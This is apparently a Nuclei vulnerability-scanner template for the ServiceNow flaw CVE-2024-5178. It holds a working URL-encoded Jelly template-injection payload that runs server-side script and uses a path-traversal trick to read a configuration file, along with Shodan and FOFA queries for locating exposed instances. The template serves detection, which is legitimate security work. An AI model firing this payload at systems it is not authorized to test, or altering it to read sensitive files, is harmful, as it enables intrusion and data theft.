id: CVE-2024-5178

info:
  name: ServiceNow - Unauthorized File Access
  author: kino
  severity: high
  description: |
    ServiceNow has addressed a file access vulnerability in the SecurelyAccess API. The vulnerability exists due to incomplete input validation, allowing an administrative user or unauthenticated user (when combined with other vulnerabilities) to gain unauthorized access to sensitive files on the web application server. The vulnerability is addressed in patches released during the June 2024 patching cycle.
  reference:
    - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
    - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1648312
    - https://arcticwolf.com/resources/blog/cve-2024-4879-cve-2024-5178-cve-2024-5217/
  metadata:
    verified: true
    max-request: 1
    vendor: servicenow
    product: servicenow
    shodan-query:
      - http.favicon.hash:"1701804003"
      - http.title:"servicenow"
    fofa-query:
      - icon_hash=1701804003
      - title="servicenow"
    google-query: intitle:"servicenow"
  tags: cve,cve2024,servicenow,bypass,file-access,kev

http:
  - raw:
      - |
        GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj%3Ajelly%20xmlns%3Aj%3D%22jelly%22%20xmlns%3Ag%3D%27glide%27%3E%3Cg%3Aevaluate%3E
        try%20%7B
        %20%20z%3Dnew%20Packages.java.io.File%28%22%22%29.getAbsolutePath%28%29%3B
        %20%20z%3Dz.substring%280%2Cz.lastIndexOf%28%22%2F%22%29%29%3B
        %20%20path%20%3D%20z.concat%28%22%2Fco..nf%2Fversion.properties%22%29%3B
        %20%20u%3Dnew%20SecurelyAccess%28path%29.getBufferedReader%28%29%3B
        %20%20s%3D%22File%20path%3A%20%22%20%2B%20path%20%2B%20%22%5Cn%22%3B
        %20%20while%28%28q%3Du.readLine%28%29%29%21%3D%3Dnull%29
        %20%20%20%20s%3Ds.concat%28q%2C%22%5Cn%22%29%3B
        %20%20gs.addErrorMessage%28s%29%3B
        %7D%20catch%28e%29%20%7B
        %20%20gs.addErrorMessage%28%22Error%3A%20%22%20%2B%20e.message%29%3B
        %7D
        %3C%2Fg%3Aevaluate%3E%3C%2Fj%3Ajelly%3E%3C%2Fstyle%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "File path:"
          - "version.properties"
          - "co..nf"
        condition: and

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
